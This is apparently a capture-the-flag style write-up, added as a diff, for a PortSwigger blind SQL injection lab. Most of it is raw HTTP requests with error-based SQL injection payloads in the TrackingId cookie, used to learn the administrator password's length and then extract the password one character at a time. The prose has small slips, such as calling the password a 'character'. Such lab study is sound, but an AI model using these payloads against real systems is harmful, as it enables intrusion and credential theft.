@@ -1,0 +1,53 @@
+Blind SQL injection with conditional errors
+
+Let the errors guide the way.
+
+Down to the password characters step, we find that 21 characters give a 200 result:
+
+GET / HTTP/1.1
+Host: ac0b1f9a1e67a6af8046780400cc003a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+Connection: close
+Cookie: TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+length(password)>20)+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--; session=JM2SJvdOK2UkqdHMgUTHbFZzr309c9gj
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
+So our character is 20 characters long.
+Let's start working through the characters.
+First request:
+
+GET / HTTP/1.1
+Host: ac0b1f9a1e67a6af8046780400cc003a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+Connection: close
+Cookie: TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,1,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--; session=JM2SJvdOK2UkqdHMgUTHbFZzr309c9gj
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
+
+Final request:
+
+GET / HTTP/1.1
+Host: ac0b1f9a1e67a6af8046780400cc003a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+Connection: close
+Cookie: TrackingId='+UNION+SELECT+CASE+WHEN+(username='administrator'+AND+substr(password,20,1)='§a§')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--; session=JM2SJvdOK2UkqdHMgUTHbFZzr309c9gj
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+
+Use the password to log in and get the lab complete prompt.
